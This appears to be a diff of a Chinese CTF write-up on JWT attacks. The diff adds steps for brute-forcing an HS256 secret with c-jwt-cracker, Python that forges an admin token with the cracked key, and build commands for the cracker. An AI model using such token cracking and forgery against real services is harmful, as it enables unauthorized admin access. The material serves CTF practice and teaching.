@@ -41,20 +41,27 @@ JWT由三个部分组成，每部分之间用点（`.`）分隔：
 
 
 
-## 题目分析
 
-> 主要是做了CTFhub上的几道题
+
+
+
+
+
+
+
+
+
+
 
 ### 敏感信息泄露
+
+> jwt一般是作为题目的一个部分，这种直接泄露信息的基本没有
 
 ```
 eyJBRyI6Ijk1MGZjYzJiZGQyZjQ0MX0iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImJ4MzM2NjEiLCJwYXNzd29yZCI6InpieDEyMzQ1NiIsIkZMIjoiY3RmaHViezY3MjQ5YTA5ZCJ9.eNgGhgI2-Bf_txI0cGiS64HfDeErXt2p2mT5UA7E_zU
 ```
 
-```
-{"AG":"950fcc2bdd2f441}","typ":"JWT","alg":"HS256"}
-{"username":"bx33661","password":"..........","FL":"ctfhub{67249a09d"}
-```
+![image-20241026150303406](https://gitee.com/bx33661/image/raw/master/path/image-20241026150303406.png)
 
 得到flag
 
@@ -281,4 +288,106 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN
 ![image-20240827170553593](https://gitee.com/bx33661/image/raw/master/path/image-20240827170553593.png)
 
 
+
+### [CISCN2019 华北赛区 Day1 Web2]ikun
+
+> 其中一步
+
+访问`/b1g_m4mber`
+
+提示需要admin才能访问，我们之前观察到的cookie里面的jwt，我们现在使用`c-jwtcrack`爆破这个密钥---------------> ·1Kun·
+
+![image-20241026144241906](https://gitee.com/bx33661/image/raw/master/path/image-20241026144241906.png)
+
+```python
+import jwt
+
+# 泄露的密钥
+secret_key = "1Kun"
+
+# 载荷数据
+payload = {
+    "username": "admin"
+}
+
+# 生成JWT
+new_token = jwt.encode(payload, secret_key, algorithm="HS256")
+print("新生成的JWT:", new_token)
+```
+
+加密:
+
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
+```
+
+进入页面寻找线索：
+
+
+
+## 脚本工具
+
+JWT在线网站：**https://jwt.io/#encoded-jwt**
+
+### jwt编码与解码脚本
+
+编码--->
+
+```python
+import jwt
+
+# 泄露的密钥
+secret_key = "1Kun"
+
+# 载荷数据
+payload = {
+    "username": "admin"
+}
+
+# 生成JWT
+new_token = jwt.encode(payload, secret_key, algorithm="HS256")
+print("新生成的JWT:", new_token)
+```
+
+解码--->
+
+```python
+import jwt
+
+# JWT密钥
+secret_key = ""
+
+# JWT令牌
+jwt_token = ""
+
+try:
+    # 解密JWT
+    decoded_payload = jwt.decode(jwt_token, secret_key, algorithms=["HS256"])
+    print("解密后的载荷:", decoded_payload)
+except jwt.ExpiredSignatureError:
+    print("JWT已过期")
+except jwt.InvalidTokenError:
+    print("无效的JWT")
+```
+
+
+
+`c-jwt-cracker`工具
+
+> A multi-threaded JWT brute-force cracker written in C. If you are very lucky or have a huge computing power, this program should find the secret key of a JWT token, allowing you to forge valid tokens. This is for testing purposes only, do not put yourself in trouble :)
+
+```python
+git clone https://github.com/brendan-rius/c-jwt-cracker.git
+sudo apt install gcc
+sudo apt install make
+#确保你已经安装openssl
+sudo apt-get update
+sudo apt-get install libssl-dev
+
+make
+
+
+#使用
+./jwtcrack token
+```
 
